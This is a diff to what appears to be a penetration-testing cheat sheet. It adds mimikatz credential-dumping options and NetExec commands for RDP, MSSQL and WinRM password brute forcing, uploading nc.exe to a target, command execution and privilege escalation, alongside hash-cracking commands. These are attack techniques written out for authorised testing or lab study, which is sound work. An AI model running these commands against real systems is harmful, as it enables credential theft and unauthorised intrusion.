@@ -654,7 +654,7 @@
     john --wordlist=/usr/share/wordlists/rockyou.txt asc_hash
     ```
   
-  + ```hashcat```:
+  + ```hashcat``` (sometimes hash formats need to be corrected before cracking):
 
     ```sh
     hashcat -a 0 -m 1600 apachehash.txt /usr/share/wordlists/rockyou.txt
@@ -733,4 +733,20 @@
 
   + test with latest version of the tool in case the standard binary does not work
 
-  + in case of a non-interactive shell, we can run the binary in a single command without entering the mimikatz prompt - ```.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"```
+  + in case of a non-interactive shell, we can run the binary in a single command without entering the mimikatz prompt - ```.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "sekurlsa::credman" "exit"```
+
++ ```nxc``` - covering some usecases, refer [netexec wiki](https://www.netexec.wiki) for complete commands:
+
+  + RDP bruteforce - ```nxc rdp 192.168.89.111 -u usernames.txt -p 'Summer123!' --ignore-pw-decoding```
+
+  + MSSQL bruteforce - ```nxc mssql 192.168.89.111 -u usernames.txt -p passwords.txt --ignore-pw-decoding --continue-on-success --local-auth```
+
+  + uploading via MSSQL - ```nxc mssql 172.16.89.202 -u 'svc_sql' -p 'Password123!' --put-file ~/Tools/nc.exe C:\\Users\\Public\\nc.exe```
+
+  + MSSQL command execution - ```nxc mssql 172.16.89.202 -u 'svc_sql' -p 'Password123!' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'```
+
+  + MSSQL module for privesc - ```nxc mssql 172.16.89.202 -u 'svc_sql' -p 'Password123!' --local-auth -M mssql_priv```
+
+  + MSSQL RID bruteforce - ```nxc mssql 172.16.89.202 -u 'svc_sql' -p 'Password123!' --local-auth --rid-brute```
+
+  + WinRM bruteforce - ```nxc winrm 192.168.10.24 -u usernames.txt -p passwords.txt --ignore-pw-decoding --continue-on-success```
